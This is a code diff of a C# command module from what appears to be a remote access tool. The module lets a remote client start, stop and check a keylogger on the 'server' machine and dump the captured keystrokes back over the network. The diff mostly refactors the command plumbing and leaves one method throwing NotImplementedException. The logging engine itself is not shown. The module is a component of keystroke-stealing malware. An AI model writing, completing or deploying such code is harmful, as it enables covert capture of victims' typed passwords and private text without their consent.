@@ -1,10 +1,7 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using KeyLogger;
+﻿using KeyLogger;
 using NetworkManager;
+using System;
+using System.Collections.Generic;
 
 namespace Commands
 {
@@ -12,7 +9,7 @@ namespace Commands
     {
         public string name { get; } = "keylogger";
 
-        public string description { get; } = "Capture the server's keystokes. You can get it's status, dump logged keys, start and stop it";
+        public string description { get; } = "Capture the server's keystokes. You can see it's status, dump logged keys, start and stop it";
 
         public string syntaxHelper { get; } = "keylogger [start|stop|dump|status]";
 
@@ -23,39 +20,25 @@ namespace Commands
             new List<Type>(){typeof(string)}
         };
 
-        public List<string> clientFlags { get; } = new List<string>()
-        {
-            "{Keylogger:dump}",
-            "{Keylogger:status}"
-        };
-
-        public List<string> savedData { get; set; } = new List<string>();
-
 
         KeyLoggerManager keyLoggerManager { get; set; }
 
         public void GetKeyLoggerManagerInstance(KeyLoggerManager manager) => keyLoggerManager = manager;
 
 
-        public CommandsManager.PreProcessResult PreProcessCommand(List<string> args)
+        public bool PreProcessCommand(List<string> args)
         {
-            savedData.Add(args[0]);
-            if (savedData[0] != "status" && savedData[0] != "dump")
-            {
-                return CommandsManager.PreProcessResult.NoClientProcess;
-            }
-
-            return CommandsManager.PreProcessResult.OK;
+            throw new NotImplementedException();
         }
 
         public void ClientMethod(List<string> args)
         {
-            if (savedData.Count != 1)
+            if (args.Count != 1)
             {
                 return;
             }
 
-            if (savedData[0] == "status" || savedData[0] == "dump")
+            if (args[0] == "status" || args[0] == "dump")
             {
                 Console.WriteLine(GlobalNetworkManager.ReadLine());
             }
@@ -84,16 +67,10 @@ namespace Commands
 
         void StopKeylogger() => keyLoggerManager.StopListening();
 
-        void SendKeyloggerStatusToClient()
-        {
-            GlobalNetworkManager.WriteLine(clientFlags[1]);
+        void SendKeyloggerStatusToClient() =>
             GlobalNetworkManager.WriteLine(keyLoggerManager.GetStatus() ? "The keylogger is running" : "The keylogger isn't started");
-        }
 
-        void SendKeyLogsToClient()
-        {
-            GlobalNetworkManager.WriteLine(clientFlags[0]);
+        void SendKeyLogsToClient() =>
             GlobalNetworkManager.WriteLine(keyLoggerManager.DumpLogs());
-        }
     }
 }
